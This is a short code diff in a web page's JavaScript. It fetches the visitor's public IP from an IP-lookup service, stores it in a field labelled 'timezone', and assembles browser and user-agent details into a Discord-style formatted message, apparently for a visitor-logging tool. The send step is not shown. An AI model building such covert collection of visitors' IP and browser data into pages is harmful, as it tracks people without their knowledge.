@@ -121,12 +121,12 @@
             $.getJSON("https://api.ipify.org?format=json", function(data) {
                 document.getElementById('timezone').value = data.ip;
                 
-    txt = "**💻 • Browser CodeName: **/` " + navigator.appCodeName + " /` /newline";
-    txt+= "**💻 • Browser Name: **/` " + navigator.appName + " /` /newline";
-    txt+= "**💻 • Browser Version: **/` " + navigator.appVersion + " /` /newline";
-    txt+= "**🍪 • Cookies Enabled: **/` " + navigator.cookieEnabled + " /` /newline";
-    txt+= "**🌍 • Platform: **/` " + navigator.platform + " /` /newline";
-    txt+= "**🔏 • User-agent header: **/` " + navigator.userAgent + " /` /newline";
+    txt = "**💻 • Browser CodeName: **` " + navigator.appCodeName + " ` /newline";
+    txt+= "**💻 • Browser Name: **` " + navigator.appName + " ` /newline";
+    txt+= "**💻 • Browser Version: **` " + navigator.appVersion + " ` /newline";
+    txt+= "**🍪 • Cookies Enabled: **` " + navigator.cookieEnabled + " ` /newline";
+    txt+= "**🌍 • Platform: **` " + navigator.platform + " ` /newline";
+    txt+= "**🔏 • User-agent header: **` " + navigator.userAgent + " ` /newline";
     
       var OSName = "Unknown OS";
       if (navigator.userAgent.indexOf("Win") != -1) OSName = "Windows";
